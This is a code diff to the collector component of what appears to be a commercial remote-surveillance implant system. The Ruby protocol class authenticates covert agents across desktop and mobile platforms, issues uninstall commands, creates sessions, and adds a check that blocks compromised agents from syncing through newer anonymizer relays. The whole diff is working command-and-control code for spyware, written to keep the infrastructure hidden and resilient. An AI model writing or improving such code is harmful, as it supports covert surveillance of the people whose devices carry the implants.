@@ -26,17 +26,18 @@ class Protocol
   extend RCS::Crypt
   extend RCS::Collector::Commands
 
+  MIN_ANON_VERSION = '2013031101'
   PLATFORMS = ["WINDOWS", "WINMO", "OSX", "IOS", "BLACKBERRY", "SYMBIAN", "ANDROID", "LINUX"]
 
-  def self.authenticate(peer, uri, content)
+  def self.authenticate(peer, uri, content, anon_version)
     # choose between the correct authentication to use based on the packet size
-    content.length > 128 ? authenticate_scout(peer, uri, content) : authenticate_elite(peer, uri, content)
+    content.length > 128 ? authenticate_scout(peer, uri, content, anon_version) : authenticate_elite(peer, uri, content, anon_version)
   end
 
   # Authentication phase
   # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, Platform, sha1 ( BuildId, InstanceId, Platform, Cb ) )
   # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
-  def self.authenticate_elite(peer, uri, content)
+  def self.authenticate_elite(peer, uri, content, anon_version)
     trace :info, "[#{peer}] Authentication required for (#{content.length.to_s} bytes)..."
 
     # integrity check (104 byte of data, 112 padded)
@@ -140,24 +141,38 @@ class Protocol
     message = aes_encrypt(ks, DB.instance.agent_signature)
 
     # ask the database the status of the agent
-    status, bid = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
+    status, aid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
+
+    # here we have to deny the sync in case the agent and the anon are different:
+    # good and good -> ok
+    # bad and bad -> ok
+    # bad and good -> NOT OK
+    # this is done to prevent compromised agent to sync on new (good) anons
+    if (good ^ (anon_version >= MIN_ANON_VERSION))
+      trace :warn, "[#{peer}] Agent trying to sync on wrong anon (#{good}, #{anon_version})"
+      return
+    end
 
     response = [Commands::PROTO_NO].pack('I')
     # what to do based on the agent status
     case status
+      when DB::UNKNOWN_AGENT
+        # if not sure, close the connection
+        trace :info, "[#{peer}] Unknown agent status, closing..."
+        return
       when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
         response = [Commands::PROTO_UNINSTALL].pack('I')
         trace :info, "[#{peer}] Uninstall command sent (#{status})"
-        DB.instance.agent_uninstall(bid)
+        DB.instance.agent_uninstall(aid)
       when DB::QUEUED_AGENT
         response = [Commands::PROTO_NO].pack('I')
         trace :warn, "[#{peer}] was queued for license limit exceeded"
-      when DB::ACTIVE_AGENT, DB::UNKNOWN_AGENT
+      when DB::ACTIVE_AGENT
         # everything is ok or the db is not connected, proceed
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, demo, scout, k, peer)
+        cookie = SessionManager.instance.create(aid, build_id_real, instance_id, platform, demo, scout, k, peer)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
@@ -172,7 +187,7 @@ class Protocol
   # Authentication phase
   # ->  Base64 ( Crypt_S ( Pver, Kd, sha(Kc | Kd), BuildId, InstanceId, Platform ) )
   # <-  Base64 ( Crypt_C ( Ks, sha(K), Response ) )  |  SetCookie ( SessionCookie )
-  def self.authenticate_scout(peer, uri, content)
+  def self.authenticate_scout(peer, uri, content, anon_version)
     trace :info, "[#{peer}] Authentication scout required for (#{content.length.to_s} bytes)..."
 
     # remove the base64 container
@@ -269,11 +284,25 @@ class Protocol
     trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s
 
     # ask the database the status of the agent
-    status, bid = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
+    status, bid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
+
+    # here we have to deny the sync in case the agent and the anon are different:
+    # good and good -> ok
+    # bad and bad -> ok
+    # bad and good -> NOT OK
+    # this is done to prevent compromised agent to sync on new (good) anons
+    if (good ^ (anon_version >= MIN_ANON_VERSION))
+      trace :warn, "Agent trying to sync on wrong anon (#{good}, #{anon_version})"
+      return
+    end
 
     response = [Commands::PROTO_NO].pack('I')
     # what to do based on the agent status
     case status
+      when DB::UNKNOWN_AGENT
+        # if not sure, close the connection
+        trace :info, "[#{peer}] Unknown agent status, closing..."
+        return
       when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
         response = [Commands::PROTO_UNINSTALL].pack('I')
         trace :info, "[#{peer}] Uninstall command sent (#{status})"
@@ -281,7 +310,7 @@ class Protocol
       when DB::QUEUED_AGENT
         response = [Commands::PROTO_NO].pack('I')
         trace :warn, "[#{peer}] was queued for license limit exceeded"
-      when DB::ACTIVE_AGENT, DB::UNKNOWN_AGENT
+      when DB::ACTIVE_AGENT
         # everything is ok or the db is not connected, proceed
         response = [Commands::PROTO_OK].pack('I')
 
@@ -400,11 +429,11 @@ class Protocol
   # there are only two phases:
   #   - Authentication
   #   - Commands
-  def self.parse(peer, uri, cookie, content)
+  def self.parse(peer, uri, cookie, content, anon_version)
 
     # if the request does not contains any cookies,
     # we need to perform authentication first
-    return authenticate(peer, uri, content) if cookie.nil?
+    return authenticate(peer, uri, content, anon_version) if cookie.nil?
 
     # we have a cookie, check if it's valid
     return unless valid_authentication(peer, cookie)
